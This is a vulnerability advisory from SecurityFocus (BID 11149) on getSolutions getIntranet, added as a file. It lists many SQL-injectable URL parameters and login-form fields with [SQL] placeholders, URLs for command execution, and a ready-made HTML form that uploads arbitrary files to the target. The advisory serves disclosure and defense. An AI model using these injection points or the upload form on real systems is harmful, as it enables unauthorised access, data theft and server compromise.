@@ -1,0 +1,51 @@
+source: http://www.securityfocus.com/bid/11149/info
+
+Reportedly getSolutions getIntranet is affected by multiple remote input validation vulnerabilities. These issues are caused by a failure of the application to properly sanitize user-supplied input.
+
+These issues may be leveraged to carry out SQL injection attacks, HTML injection attacks, arbitrary file uploads, privilege escalation, command execution in the context of the vulnerable application, and command execution in the context of the affected system.
+
+SQL injection attacks:
+http://www.example.com/welcome.asp?id=[SQL]
+http://www.example.com/welcome.asp?page=search.asp&search=[SQL]
+http://www.example.com/welcome.asp?page=content_display.asp&id=[SQL]
+http://www.example.com/welcome.asp?page=customer_list.asp&ctype=[SQL]
+http://www.example.com/welcome.asp?page=calendar_add.asp&id=[SQL]
+http://www.example.com/welcome.asp?action=invitation&calendarid=[SQL]&ans=1
+http://www.example.com/welcome.asp?page=employee_detail.asp&lid=&id=[SQL]
+http://www.example.com/welcome.asp?page=customer_list.asp&ctype=[SQL]
+http://www.example.com/welcome.asp?page=front_calendar_display.asp&ctype=[SQL]
+http://www.example.com/welcome.asp?page=calendar_display.asp&id=[SQL]
+http://www.example.com/welcome.asp?page=front_content_display.asp&ctype=[SQL]
+http://www.example.com/welcome.asp?page=message_send.asp&id=[SQL]
+http://www.example.com/welcome.asp?action=delmessage&id=[SQL]
+http://www.example.com/welcome.asp?page=message.asp&id=[SQL]
+http://www.example.com/welcome.asp?page=content_search.asp&search=[SQL]
+http://www.example.com/welcome.asp?page=content_display.asp&id=[SQL]&category=[SQL]
+http://www.example.com/welcome.asp?page=category_display.asp&category=[SQL]
+http://www.example.com/welcome.asp?page=contact_form.asp&id=[SQL]
+
+SQL injection in the 'checklogin.asp' form:
+username: [SQL]
+password: [SQL]
+
+SQL injection in the 'lostpassword.asp' form:
+Name: [SQL]
+Surname: [SQL]
+ID Number: [SQL]
+
+Arbitrary command execution within the context of the affected application:
+http://www.example.com/welcome.asp?id=30&ctype=1&lid=f30&page=folder_detail.asp
+http://www.example.com/welcome.asp?page=message.asp&id=4
+http://www.example.com/welcome.asp?action=delmessage&id=3
+
+File upload vulnerability:
+<form method="post" action="http://www.example.com/fileupload.asp" enctype="multipart/form-data" id="form1" name="form1">
+<input type="hidden" name="t1" value="25"><input type="hidden" name="t2" value="13">
+<input type="file" name="file" value="" size="20" class="formitem">	
+<textarea name="t3" size="20" class="textarea" rows="5" cols="40">&lt;/textarea&gt;	
+<input type="hidden" name="t4" value="1">
+<input type="hidden" name="flds" value="4"><input type="hidden" name="proc" value="sp_login_upload_write">
+<input type="hidden" name="lid" value=""><input type="hidden" name="upload" value="upload"><input type="hidden" name="customer" value="">
+<input type="hidden" name="page" value="login_detail.asp"><input type="hidden" name="basepage" value="welcome.asp"></td>
+<input type="submit" name="Action" value="Upload" class="formitembutton">
+</form>
